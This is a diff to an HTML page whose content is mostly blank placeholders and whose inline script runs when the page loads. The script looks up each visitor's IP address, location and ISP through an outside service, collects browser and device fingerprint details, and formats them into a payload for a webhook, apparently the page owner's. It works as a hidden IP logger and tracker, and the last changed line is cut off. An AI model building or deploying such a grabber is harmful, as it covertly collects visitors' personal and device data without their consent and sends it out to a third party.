@@ -8,12 +8,6 @@
         margin: 0;
         padding: 0;
       }
-      header {
-        background-color: #333;
-        color: #fff;
-        padding: 10px;
-        text-align: center;
-      }
       h1 {
         margin: 0;
         font-size: 32px;
@@ -27,18 +21,9 @@
         color: red;
         font-weight: bold;
       }
-      footer {
-        background-color: #333;
-        color: #fff;
-        padding: 10px;
-        text-align: center;
-      }
     </style>
   </head>
   <body>
-    <header>
-      <h1> </h1>
-    </header>
     <main>
       <p>
         
@@ -65,9 +50,6 @@
         <span class="danger"> </span>
       </p>
     </main>
-    <footer>
-        
-    </footer>
     <script>
       let echolog = {};
       fetch("https://wtfismyip.com/json")
@@ -102,7 +84,7 @@
 
           // Set up the payload for the webhook
           const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry C[...]
           };
           // This is a lazy way of doing it, having
           // your webhook url out in the open like
